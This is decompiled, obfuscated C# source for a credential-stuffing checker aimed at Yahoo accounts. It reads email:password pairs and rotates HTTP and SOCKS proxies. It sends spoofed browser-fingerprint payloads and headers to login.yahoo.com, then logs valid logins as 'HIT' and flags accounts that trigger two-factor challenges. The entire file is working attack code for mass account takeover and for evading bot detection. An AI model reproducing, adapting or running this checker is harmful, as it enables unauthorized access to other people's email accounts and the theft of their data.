using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Threading;
using Colorful;
using Leaf.xNet;

// Token: 0x0200000F RID: 15
internal class Class8
{
	// Token: 0x0600003E RID: 62 RVA: 0x000041AC File Offset: 0x000023AC
	public static bool smethod_0(string[] string_0, string string_1)
	{
		bool result;
		if (0 >= Class2.class3_0.Int32_1)
		{
			result = false;
		}
		else
		{
			for (;;)
			{
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						httpRequest.IgnoreProtocolErrors = true;
						string_1 = Class6.ienumerable_1.ElementAt(new Random().Next(Class6.int_10));
						if (Class6.string_1 == "HTTP")
						{
							httpRequest.Proxy = HttpProxyClient.Parse(string_1);
						}
						if (Class6.string_1 == "SOCKS4")
						{
							httpRequest.Proxy = Socks4ProxyClient.Parse(string_1);
						}
						if (Class6.string_1 == "SOCKS5")
						{
							httpRequest.Proxy = Socks5ProxyClient.Parse(string_1);
						}
						new List<string>();
						httpRequest.EnableEncodingContent = false;
						httpRequest.AllowAutoRedirect = true;
						httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
						httpRequest.AddHeader("Pragma", "no-cache");
						httpRequest.AddHeader("Accept", "*/*");
						httpRequest.Get("https://login.yahoo.com/", null);
						string text = Class6.smethod_8(string.Format("{0}", httpRequest.Response), "name=\"crumb\" value=\"", "\"");
						string text2 = Class6.smethod_8(string.Format("{0}", httpRequest.Response), "name=\"acrumb\" value=\"", "\"");
						string text3 = Class6.smethod_8(string.Format("{0}", httpRequest.Response), "name=\"sessionIndex\" value=\"", "\"");
						httpRequest.ClearAllHeaders();
						httpRequest.EnableEncodingContent = false;
						httpRequest.AllowAutoRedirect = true;
						httpRequest.AddHeader("Host", "login.yahoo.com");
						httpRequest.AddHeader("Connection", "keep-alive");
						httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36");
						httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
						httpRequest.AddHeader("Origin", "https://login.yahoo.com");
						httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
						httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
						httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
						httpRequest.AddHeader("Referer", "https://login.yahoo.com/");
						httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
						httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
						httpRequest.Post("https://login.yahoo.com/", string.Concat(new string[]
						{
							"browser-fp-data=%7B%22language%22%3A%22en-US%22%2C%22colorDepth%22%3A24%2C%22deviceMemory%22%3A8%2C%22pixelRatio%22%3A1%2C%22hardwareConcurrency%22%3A4%2C%22timezoneOffset%22%3A-120%2C%22timezone%22%3A%22Africa%2FCairo%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22openDatabase%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22Win32%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A3%2C%22hash%22%3A%22e43a8bc708fc490225cde0663b28278c%22%7D%2C%22canvas%22%3A%22canvas%20winding%3Ayes~canvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Google%20Inc.~ANGLE%20(NVIDIA%20GeForce%20GT%20710%20Direct3D11%20vs_5_0%20ps_5_0)%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A0%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221280%22%2C%22h%22%3A%221024%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22984%22%2C%22h%22%3A%221280%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1611840196072%2C%22render%22%3A1611840197054%7D%7D&crumb=",
							text,
							"&acrumb=",
							text2,
							"&sessionIndex=",
							text3,
							"&displayName=&deviceCapability=%7B%22pa%22%3A%7B%22status%22%3Afalse%7D%7D&username=",
							string_0[0],
							"&passwd=&signin=Next&persistent=y"
						}), "application/x-www-form-urlencoded");
						if (string.Format("{0}", httpRequest.Response).Contains("location\":\"/account/challenge/password"))
						{
							string str = Class6.smethod_8(httpRequest.Response.ToString(), "location\":\"", "\"");
							httpRequest.ClearAllHeaders();
							httpRequest.EnableEncodingContent = false;
							httpRequest.AllowAutoRedirect = true;
							httpRequest.AddHeader("Host", "login.yahoo.com");
							httpRequest.AddHeader("Connection", "keep-alive");
							httpRequest.AddHeader("Cache-Control", "max-age=0");
							httpRequest.AddHeader("Upgrade-Insecure-Requests", "1");
							httpRequest.AddHeader("Origin", "https://login.yahoo.com");
							httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36");
							httpRequest.AddHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9");
							httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
							httpRequest.AddHeader("Sec-Fetch-Mode", "navigate");
							httpRequest.AddHeader("Sec-Fetch-User", "?1");
							httpRequest.AddHeader("Sec-Fetch-Dest", "document");
							httpRequest.AddHeader("Referer", "https://login.yahoo.com/");
							httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
							httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");
							httpRequest.Post("https://login.yahoo.com" + str, string.Concat(new string[]
							{
								"browser-fp-data=%7B%22language%22%3A%22en%22%2C%22colorDepth%22%3A32%2C%22deviceMemory%22%3A%22unknown%22%2C%22pixelRatio%22%3A2%2C%22hardwareConcurrency%22%3A%22unknown%22%2C%22timezoneOffset%22%3A-60%2C%22timezone%22%3A%22Africa%2FCasablanca%22%2C%22sessionStorage%22%3A1%2C%22localStorage%22%3A1%2C%22indexedDb%22%3A1%2C%22cpuClass%22%3A%22unknown%22%2C%22platform%22%3A%22iPhone%22%2C%22doNotTrack%22%3A%22unknown%22%2C%22plugins%22%3A%7B%22count%22%3A0%2C%22hash%22%3A%2224700f9f1986800ab4fcc880530dd0ed%22%7D%2C%22canvas%22%3A%22canvas+winding%3Ayes%7Ecanvas%22%2C%22webgl%22%3A1%2C%22webglVendorAndRenderer%22%3A%22Apple+Inc.%7EApple+GPU%22%2C%22adBlock%22%3A0%2C%22hasLiedLanguages%22%3A0%2C%22hasLiedResolution%22%3A0%2C%22hasLiedOs%22%3A1%2C%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A5%2C%22event%22%3A1%2C%22start%22%3A1%7D%2C%22fonts%22%3A%7B%22count%22%3A13%2C%22hash%22%3A%22ef5cebb772562bd1af018f7f69d53c9e%22%7D%2C%22audio%22%3A%2235.10892717540264%22%2C%22resolution%22%3A%7B%22w%22%3A%22414%22%2C%22h%22%3A%22896%22%7D%2C%22availableResolution%22%3A%7B%22w%22%3A%22896%22%2C%22h%22%3A%22414%22%7D%2C%22ts%22%3A%7B%22serve%22%3A1604943657070%2C%22render%22%3A1604943657274%7D%7D&crumb=",
								text,
								"&acrumb=",
								text2,
								"&sessionIndex=",
								text3,
								"&displayName=",
								string_0[0],
								"&passwordContext=normal&password=",
								string_0[1],
								"&verifyPassword=Next"
							}), "application/x-www-form-urlencoded");
							if (string.Format("{0}", httpRequest.Response).Contains("Invalid password") || string.Format("{0}", httpRequest.Response).Contains("Please provide\u00a0password"))
							{
								result = false;
								break;
							}
							if (string.Format("{0}", httpRequest.Response.Address).Contains("https://maktoob.yahoo.com") || string.Format("{0}", httpRequest.Response.Address).Contains("https://mail.yahoo.com/") || string.Format("{0}", httpRequest.Response.Address).Contains("https://login.yahoo.com/account/comm-channel/refresh") || string.Format("{0}", httpRequest.Response).Contains("Don&#x27;t lose access to your\u00a0account") || string.Format("{0}", httpRequest.Response).Contains("Do not block yourself from logging in") || string.Format("{0}", httpRequest.Response).Contains("Don't lose access to your account") || string.Format("{0}", httpRequest.Response.Address).Contains("https://login.yahoo.com/account/update") || string.Format("{0}", httpRequest.Response.Address).Contains("https://login.yahoo.com/account/fb-messenger-linking") || string.Format("{0}", httpRequest.Response).Contains("Use Messenger to recover your account") || string.Format("{0}", httpRequest.Response).Contains("Make sure your account is secure") || string.Format("{0}", httpRequest.Response).Contains("Manage Accounts") || string.Format("{0}", httpRequest.Response).Contains("Sign Out"))
							{
								Class6.int_2++;
								if (Class6.string_2 == "2")
								{
									Colorful.Console.WriteLineFormatted(" {0} Email: {1} Password: {2}", ColorTranslator.FromHtml(Class5.string_3), ColorTranslator.FromHtml(Class5.string_2), new object[]
									{
										"[HIT]",
										string_0[0],
										string_0[1]
									});
								}
								Class7.smethod_0("Yahoo", "Hit", string_0[0] + ":" + string_0[1] + " | HIT");
							}
							else
							{
								if (string.Format("{0}", httpRequest.Response.Address).Contains("https://login.yahoo.com/account/challenge/challenge-selector") || string.Format("{0}", httpRequest.Response).Contains("Help us to keep your account safe") || string.Format("{0}", httpRequest.Response).Contains("We've noticed some unusual account activity") || string.Format("{0}", httpRequest.Response).Contains("For your safety, choose a method below to verify that it&#x27;s really you signing in to this\u00a0account"))
								{
									Class7.smethod_0("Yahoo", "2FA", string_0[0] + ":" + string_0[1] + " | 2FA");
									Class6.int_7++;
									result = false;
									break;
								}
								if (string.Format("{0}", httpRequest.Response).Contains("location\":\"/account/challenge/recaptcha") || string.Format("{0}", httpRequest.Response).Contains("location\":\"/account/challenge/arkose") || string.Format("{0}", httpRequest.Response).Contains("Uh oh, looks as though something went wrong"))
								{
								}
							}
						}
						else
						{
							if (string.Format("{0}", httpRequest.Response).Contains("error\":\"messages.INVALID_USERNAME") || string.Format("{0}", httpRequest.Response).Contains("error\":\"messages.ERROR_NOTFOUND") || string.Format("{0}", httpRequest.Response).Contains("messages.INVALID_IDENTIFIER") || string.Format("{0}", httpRequest.Response).Contains("Sorry, we don't recognize this account"))
							{
								result = false;
								break;
							}
							if (string.Format("{0}", httpRequest.Response).Contains("/account/challenge/push") || string.Format("{0}", httpRequest.Response).Contains("/account/challenge/yak-code"))
							{
								Class6.int_7++;
								result = false;
								break;
							}
							if (!string.Format("{0}", httpRequest.Response).Contains("location\":\"/account/challenge/recaptcha") && !string.Format("{0}", httpRequest.Response).Contains("location\":\"/account/challenge/arkose"))
							{
							}
						}
						Interlocked.Increment(ref Class6.int_8);
					}
				}
				catch (Exception ex)
				{
					if (ex.ToString().Contains("Index was outside the bounds of the array"))
					{
						result = false;
						break;
					}
					Class6.int_4++;
				}
			}
		}
		return result;
	}
}
